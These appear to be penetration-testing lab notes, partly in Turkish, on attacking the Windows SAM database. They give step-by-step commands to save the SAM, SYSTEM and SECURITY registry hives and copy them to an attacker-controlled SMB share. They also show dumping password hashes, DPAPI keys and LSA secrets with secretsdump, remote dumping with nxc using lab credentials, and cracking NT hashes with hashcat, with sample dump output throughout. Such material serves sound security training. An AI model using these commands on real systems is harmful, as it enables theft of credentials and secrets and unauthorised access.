# Attacking SAM

## Hives

| NAME | DESCRIPTION |
|---|---|
| hklm\sam | Yerel hesap parolaları ile ilişkili hash dizilerini içerir. |
| hklm\system | SAM veri tabanının şifresini çözmek için gerekli olan önyükleme anahtarını (bootKey) içerir. |
| hklm\security | Domain hesapları ile ilişkili önbelleğe alınmış kimlik bilgilerini içerir. |

## Copying Hives

!!! tip

    Teknik olarak domain katılımlı olmayan hesaplar için SECURITY kovanını kopyalamak gerekli değildir.

SAM kovanını kopyala:

```pwsh
PS C:\Users\bob> reg save "hklm\sam" C:\sam.save
```

SYSTEM kovanını kopyala:

```pwsh
PS C:\Users\bob> reg save "hklm\system" C:\system.save
```

SECURITY kovanını kopyala:

```pwsh
PS C:\Users\bob> reg save "hklm\security" C:\security.save
```

## Transferring Hives

### Creating a Share

```sh
my@attack:~$ sudo smbserver.py -smb2support share /tmp
```

### Moving Hives to Share

SAM kovanını paylaşıma taşı:

```pwsh
PS C:\Users\bob> cmd.exe /c copy C:\sam.save \\10.10.15.223\share
```

SYSTEM kovanını paylaşıma taşı:

```pwsh
PS C:\Users\bob> cmd.exe /c copy C:\system.save \\10.10.15.223\share
```

SECURITY kovanını paylaşıma taşı:

```pwsh
PS C:\Users\bob> cmd.exe /c copy C:\security.save \\10.10.15.223\share
```

## Dumping Hashes

```sh
my@attack:/tmp$ secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

```output title="Output" hl_lines="8"
[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate
(Unknown User):Password123
```

## Dumping Hashes Remotely

### [SAM](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-sam) Hives

```sh
my@attack:~$ sudo nxc smb 10.129.176.199 -u 'bob' -p 'HTB_@cademy_stdnt!' --local-auth --sam
```

### [LSA](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-lsa) Secrets

```sh
my@attack:~$ sudo nxc smb 10.129.176.199 -u 'bob' -p 'HTB_@cademy_stdnt!' --local-auth --lsa
```

## Cracking Hashes

```sh
my@attack:~$ hashcat --hwmon-disable -a 0 -m 1000 hashes.txt /usr/local/share/wordlists/rockyou.txt
```
